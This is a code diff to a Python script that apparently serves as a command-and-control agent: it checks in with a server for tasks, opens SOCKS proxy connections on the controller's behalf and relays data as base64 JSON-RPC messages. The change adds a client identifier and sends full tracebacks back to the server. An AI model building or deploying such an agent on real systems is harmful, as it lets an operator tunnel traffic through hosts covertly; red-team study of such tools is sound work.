@@ -9,7 +9,7 @@ import socket
 import select
 import time
 import urllib3
-import errno
+import traceback
 
 from collections import namedtuple
 
@@ -124,15 +124,17 @@ def main(url, key):
                         except Exception:
                             rep = 6
                                 
-                        atype = parameters[2]
+                        atype = parameters[3]
+                        socks_client_id = parameters[2]
                        
+                        bind_addr = remote.getsockname()[0]
+                        bind_port = remote.getsockname()[1]
+
                         if rep != 0:
-                            results = json.dumps({'remote':'-1','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
+                            results = json.dumps({'remote':'-1','socks_client_id':f'{socks_client_id}','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
                         else:
                             proxies.append(remote)
-                            bind_addr = remote.getsockname()[0]
-                            bind_port = remote.getsockname()[1]
-                            results = json.dumps({'remote':f'{proxies.index(remote)}','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
+                            results = json.dumps({'remote':f'{proxies.index(remote)}','socks_client_id':f'{socks_client_id}','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
                     if name == 'socks_upstream':
                         remote = proxies[int(parameters[0])]
                         upstream_data = base64_to_bytes(parameters[1])
@@ -170,7 +172,7 @@ def main(url, key):
                         "connectrpc": "0.0.0",
                         "error": {
                             "code":-32600,
-                            "message": string_to_base64(str(e))
+                            "message": string_to_base64(traceback.format_exc())
                         },
                         "id": check_in_task_id
                     }])
@@ -179,7 +181,7 @@ def main(url, key):
                 "connectrpc": "0.0.0",
                 "error": {
                     "code":-32700,
-                    "message": string_to_base64(str(e))
+                    "message": string_to_base64(traceback.format_exc())
                 },
                 "id": check_in_task_id
             }]
